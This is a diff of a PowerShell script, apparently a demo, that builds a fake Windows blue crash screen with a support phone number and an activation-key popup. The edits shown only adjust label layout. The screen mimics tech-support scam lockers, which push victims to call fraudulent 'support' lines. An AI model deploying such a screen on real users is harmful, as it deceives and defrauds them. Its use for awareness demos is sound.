@@ -51,16 +51,14 @@ PS> Show-BSODDemo
 	$bsodFace.Font = New-Object System.Drawing.Font('Segoe UI Light', 130, [System.Drawing.FontStyle]::Regular)
 	$bsodFace.ForeColor = [System.Drawing.Color]::White
 	$bsodFace.AutoSize = $true
-	$bsodFace.Location = New-Object System.Drawing.Point(220, 70)
+	$bsodFace.Location = New-Object System.Drawing.Point(120, 70)
 	$bsodFace.BackColor = $form.BackColor
 	$form.Controls.Add($bsodFace)
 
 	$mainMessage = New-Object System.Windows.Forms.Label
-	$mainMessage.AutoSize = $false
-	$mainMessage.Width = 900
-	$mainMessage.Height = 150
+	$mainMessage.AutoSize = $true
 	$mainMessage.Font = New-Object System.Drawing.Font('Segoe UI Light', 22, [System.Drawing.FontStyle]::Regular)
-	$mainMessage.Location = New-Object System.Drawing.Point(220, 310)
+	$mainMessage.Location = New-Object System.Drawing.Point(120, 310)
 	$mainMessage.Text = $mainText
 	$mainMessage.ForeColor = [System.Drawing.Color]::White
 	$mainMessage.BackColor = $form.BackColor
@@ -73,7 +71,7 @@ PS> Show-BSODDemo
 
 	$qrBox = New-Object System.Windows.Forms.PictureBox
 	$qrBox.Size = New-Object System.Drawing.Size(110, 110)
-	$qrBox.Location = New-Object System.Drawing.Point(220, 480)
+	$qrBox.Location = New-Object System.Drawing.Point(120, 480)
 	$qrBox.BackColor = [System.Drawing.Color]::White
 	$qrBox.BorderStyle = [System.Windows.Forms.BorderStyle]::None
 	$qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
@@ -93,10 +91,8 @@ PS> Show-BSODDemo
 	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG`r`nSupport: +1-888-888-8888"
 	$qrText.Font = New-Object System.Drawing.Font('Segoe UI Light', 13, [System.Drawing.FontStyle]::Regular)
 	$qrText.ForeColor = [System.Drawing.Color]::White
-	$qrText.AutoSize = $false
-	$qrText.Width = 500
-	$qrText.Height = 150
-	$qrText.Location = New-Object System.Drawing.Point(345, 485)
+	$qrText.AutoSize = $true
+	$qrText.Location = New-Object System.Drawing.Point(245, 485)
 	$form.Controls.Add($qrText)
 
 	# Vertical progress bar hidden - not in reference
@@ -193,11 +189,9 @@ PS> Show-BSODDemo
 	$popupText.Text = "Enter the 5 card activation key`r`nCall support at +1-888-888-8888"
 	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 12)
 	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
-	$popupText.AutoSize = $false
-	$popupText.Width = 410
-	$popupText.Height = 70
+	$popupText.BackColor = $popup.BackColor
+	$popupText.AutoSize = $true
 	$popupText.Location = New-Object System.Drawing.Point(15, 15)
-	$popupText.MaximumSize = New-Object System.Drawing.Size(410, 0)
 	$popup.Controls.Add($popupText)
 
 	$validActivationCode = '12345-67890'
